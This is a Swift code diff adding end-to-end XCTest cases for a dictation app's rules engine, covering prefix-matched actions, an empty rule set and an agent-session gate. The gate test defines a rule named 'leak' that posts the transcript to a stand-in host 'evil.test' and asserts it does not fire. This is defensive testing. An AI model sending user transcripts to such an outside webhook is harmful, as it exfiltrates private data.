@@ -411,6 +411,58 @@ final class FeatureMatrixE2ETests: XCTestCase {
     }
 
 
+    // MARK: - (N) Rules engine (MAK-43), driven from fixture audio
+
+    /// The post-completion rules engine keys on REAL transcribed output: drive a
+    /// fixture through the pipeline, then run the pure `RulePlanner` over the cleaned
+    /// transcript exactly as `AppState.fireRules` does at the llm-complete hook. A
+    /// prefix-matching rule fires its actions; the transcript reaches the action plan.
+    func testRulesEngineFiresOnTranscribedOutput() throws {
+        let transcript = try driveCleaned(
+            fixture: "plain_speech.wav",
+            transcript: "todo buy milk and eggs",
+            config: .plain
+        )
+        XCTAssertFalse(transcript.isEmpty, "fixture should transcribe to non-empty text")
+
+        let rule = Rule(
+            name: "archive todos",
+            hook: .llmComplete,
+            match: RuleTextMatch(kind: .prefix, pattern: "todo"),
+            sessionMode: .dictation,
+            actions: [.appendFile(config: FileOutputConfig(path: "~/todos.md")), .openURL(template: "x://{{text}}")]
+        )
+        let ctx = RuleContext(hook: .llmComplete, text: transcript,
+                              appBundleID: "com.apple.Notes", isAgentSession: false)
+        let plan = RulePlanner.plan(rules: RuleSet(rules: [rule]), context: ctx)
+        XCTAssertEqual(plan.count, 2, "both actions of the matching rule should be planned")
+        XCTAssertEqual(plan.first?.ruleName, "archive todos")
+    }
+
+    /// Fail-open invariant: an empty rule set plans nothing over a real transcript, so
+    /// the engine is a pure no-op on the normal insert path.
+    func testRulesEngineEmptySetIsNoOpOnRealTranscript() throws {
+        let transcript = try driveCleaned(
+            fixture: "plain_speech.wav", transcript: "just some words", config: .plain
+        )
+        let ctx = RuleContext(hook: .llmComplete, text: transcript, appBundleID: nil, isAgentSession: false)
+        XCTAssertTrue(RulePlanner.plan(rules: .empty, context: ctx).isEmpty)
+    }
+
+    /// A dictation-only rule must NOT fire on an agent-bridge session even when its
+    /// text/app match — the agent gate is the security boundary.
+    func testRulesEngineAgentGateOverRealTranscript() throws {
+        let transcript = try driveCleaned(
+            fixture: "plain_speech.wav", transcript: "send this everywhere", config: .plain
+        )
+        let leaky = Rule(name: "leak", hook: .llmComplete, match: .always,
+                         sessionMode: .dictation,
+                         actions: [.postWebhook(config: WebhookConfig(url: "https://evil.test/hook"))])
+        let ctx = RuleContext(hook: .llmComplete, text: transcript, appBundleID: nil, isAgentSession: true)
+        XCTAssertTrue(RulePlanner.plan(rules: RuleSet(rules: [leaky]), context: ctx).isEmpty,
+                      "dictation-only rule must not fire on an agent session")
+    }
+
     // MARK: - LLM refine feature, driven from fixture audio
     //
     // These exercise the two-utterance refine flow end-to-end: real FileAudioCapture
